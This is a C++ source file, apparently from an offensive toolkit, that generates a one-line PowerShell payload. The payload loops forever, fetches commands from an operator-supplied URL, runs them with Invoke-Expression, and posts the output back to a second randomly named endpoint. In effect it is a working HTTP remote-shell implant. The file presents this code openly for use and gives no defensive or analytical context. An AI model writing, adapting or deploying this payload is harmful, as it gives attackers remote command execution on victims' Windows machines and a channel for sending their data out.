#include <iostream>
#include <string>
#include <algorithm>  // for remove
#include <cstdlib>    // for rand, srand
#include <ctime>      // for time

using namespace std;

// Function to generate a random alphanumeric string of given length
string generate_random_string(int length) {
    static const char charset[] =
        "abcdefghijklmnopqrstuvwxyz"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "0123456789";

    string result;
    result.reserve(length);

    for (int i = 0; i < length; ++i) {
        result += charset[rand() % (sizeof(charset) - 1)];
    }

    return result;
}

// Function to generate the PowerShell payload in one line
string payload_generator_windows(string url) {
    // Remove any newline or carriage return characters from URL
    url.erase(remove(url.begin(), url.end(), '\n'), url.end());
    url.erase(remove(url.begin(), url.end(), '\r'), url.end());

    // Generate unique endpoint names
    string endpoint1 = generate_random_string(8);
    string endpoint2 = generate_random_string(8);

    // Construct the entire payload string in one line
    string payload =
    "while ($true) { try { $response = Invoke-WebRequest -Uri \"" + url + "/" + endpoint1 +
    "\" -WebSession $session -ErrorAction Stop; $command = $response.Content.Trim(); if ($command) { try { $output = Invoke-Expression -Command $command 2>&1 | Out-String; $body = @{ Result = $output }; try { Invoke-WebRequest -Uri \"" + url + "/" + endpoint2 +
    "\" -WebSession $session -Method Post -Body $body -ContentType \"application/x-www-form-urlencoded\" -TimeoutSec 5 -ErrorAction Stop | Out-Null } catch [System.Net.WebException] { } catch { } } catch { $errorBody = @{ Result = 'ERROR: $_' }; Invoke-WebRequest -Uri \"" + url + "/" + endpoint2 +
    "\" -WebSession $session -Method Post -Body $errorBody -ContentType \"application/x-www-form-urlencoded\" | Out-Null } } } catch [System.Net.WebException] { Start-Sleep -Seconds 1; continue } catch { } Start-Sleep -Milliseconds 500 }";

    return payload;
}